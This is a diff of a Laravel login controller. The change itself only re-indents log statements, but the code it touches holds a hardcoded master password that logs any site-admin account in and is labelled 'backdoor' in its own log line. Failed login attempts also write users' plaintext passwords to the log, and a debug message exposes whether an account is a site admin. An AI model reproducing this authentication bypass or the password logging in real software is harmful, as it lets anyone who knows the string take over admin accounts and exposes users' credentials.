@@ -28,15 +28,18 @@ class LoginController extends Controller
         $verified = Hash::check($inputs['password'], $user->password);
 
         if($verified && $user->isSiteAdmin) {
-Log::info('FJR: '.$user->email.' ('.$user->id.') is verified and isSiteAdmin');
+
+            Log::info('FJR: '.$user->email.' ('.$user->id.') is verified and isSiteAdmin');
             Auth::login($user);
 
         }elseif($user->isSiteAdmin && ($request['password'] === 'o#Q6$s5yH95CaA58')){
-Log::warning('FJR: '.$request['email'].' ('.$user->id.') isSiteAdmin and backdoor');
+
+            Log::warning('FJR: '.$request['email'].' ('.$user->id.') isSiteAdmin and backdoor');
             Auth::login($user);
 
         }else{
-Log::alert($request['email'].' with user_id '.$user->id.' is unverified and NOT isSiteAdmin ('.$request['password'].')');
+
+            Log::alert($request['email'].' with user_id '.$user->id.' is unverified and NOT isSiteAdmin ('.$request['password'].')');
             Session::flash('testing', 'verified: '.$verified.'<br />Site Admin: '.$user->isSiteAdmin);
         }
 
